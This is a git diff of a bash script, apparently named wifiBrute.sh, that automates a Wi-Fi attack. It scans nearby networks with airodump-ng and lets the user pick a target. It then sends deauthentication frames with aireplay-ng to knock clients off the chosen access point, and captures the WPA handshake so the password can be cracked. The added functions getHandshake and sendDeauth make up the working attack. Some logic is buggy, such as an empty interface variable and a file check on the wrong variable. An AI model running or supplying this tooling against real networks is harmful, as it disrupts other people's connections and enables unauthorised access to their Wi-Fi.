@@ -35,7 +35,8 @@ run_airodump() {
     echo -e "${GREEN}[+]~: ${NC}Scanning for Wi-Fi networks on interface $interface..."
     echo -e "${YELLOW}[+]~: When you Finish Scaning Press [Ctrl + c]"
     xterm -geometry 100x50 -e "airodump-ng $interface --output-format csv -w outputfile"
-    filter_info outputfile-01.csv 
+    filter_info outputfile-01.csv
+    exit 0
 }
 
 filter_info() {
@@ -52,9 +53,12 @@ filter_info() {
 }
 
 sendDeauth () {
-  local bssid=$1
-  local interface=$2
-  aireplay-ng --deauth 50 -a $bassid $interface
+    local bssid=$1
+    local interface=$2
+    echo -e "${RED}"
+    xterm -geometry 70x50 -e "aireplay-ng -0 10 -a $bssid $interface"
+    echo -e "${NC}"
+
 }
 
 # Function to print table headers
@@ -88,7 +92,7 @@ choseTargetAp () {
         echo -e "${RED}[!] ${NC}No networks found. try to run script Again"
         break
       elif [ "$total_lines" -eq "1" ]; then
-        echo "Choosing the default one."
+            startAttacking "1" "$input_file"
         break
       else
         read -p "Set target Network Number: " targetAp
@@ -106,17 +110,51 @@ startAttacking () {
     local fileAps=$2
     local filtered=$(sed -n "${lineNum}p" "$fileAps")
     
-    local targetAp=$(echo "$filtered" | awk '{print $3}')
-    local targetBSSID=$(echo "$filtered" | awk '{print $1}')
-    local targetChannel=$(echo "$filtered" | awk '{print $2}')
+    local targetAp=$(echo "$filtered" | awk '{print $3}' | sed 's/,//g')
+    local targetBSSID=$(echo "$filtered" | awk '{print $1}' | sed 's/,//g')
+    local targetChannel=$(echo "$filtered" | awk '{print $2}' | sed 's/,//g')
+    local interface=
+    echo -e "Your Target Network ${YELLOW}$targetAp ${NC}"
+    read -p "[ Press Enter to continue ]"
+    echo -e "${GREEN}"
+    read -p "[*] Do you Have Handshake File [y/n] : " hand_shake
+    echo -e "${NC}"
+    if [ "$hand_shake" == "yes" ] || [ "$hand_shake" == "y" ]; then
+        while true; do
+            read -p "[*] Path >: " handshake_file
+            if [ -f "$path" ]; then
+                break
+            else
+                echo "File does not exist."
+            fi
+        done 
+    else
+        echo -e "${YELLOW}"
+        echo -e "Start Get handshake File"
+        read -p "[ Press Enter ]"
+        getHandshake "$targetBSSID" "$targetChannel"
+        echo -e "${NC}"
 
-    echo "$targetAp"
+
+    fi
+
     
 
 
 }
 
+getHandshake () {
+    local bssid=$1
+    local channel=$2
+    local interfaceLocal=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {print name}')
+    local currentPath=$(pwd)
 
+    echo "$currentPath"
+    echo "$bssid $channel $interfaceLocal"
+    cd $currentPath/handshake
+    sendDeauth "$bssid" "$interfaceLocal" &
+    xterm -geometry 100x50 -e "airodump-ng -c $channel --bssid $bssid -w psk $interfaceLocal"
+}
 
 
 
@@ -126,7 +164,7 @@ check_monitor_mode_support() {
     # Check if the phy80211 directory exists for the interface
     if [ -d "/sys/class/net/$interface/phy80211" ]; then
         sleep 0.4
-        echo -e "${GREEN}[*]~: ${NC}Interface ($interface) supports monitor mode !"o
+        echo -e "${GREEN}[*]~: ${NC}Interface ($interface) supports monitor mode !"
         sleep 1
         mode=$(iwconfig $interface | grep "Mode:" | awk '{print $4}')
         if [ "$mode" = "Mode:Monitor" ]; then
@@ -180,7 +218,7 @@ trap ctrl_c SIGINT
 checkRoot () { 
     if [ "$(id -u)" != "0" ]; then
         echo "[!] We need root permition !"
-        echo "[+] Try run with [ sudo ./wifiBrute.sh] "
+        echo "[+] Try run with [ sudo ./wifiBrute.sh ] "
     else 
         clear
         banner
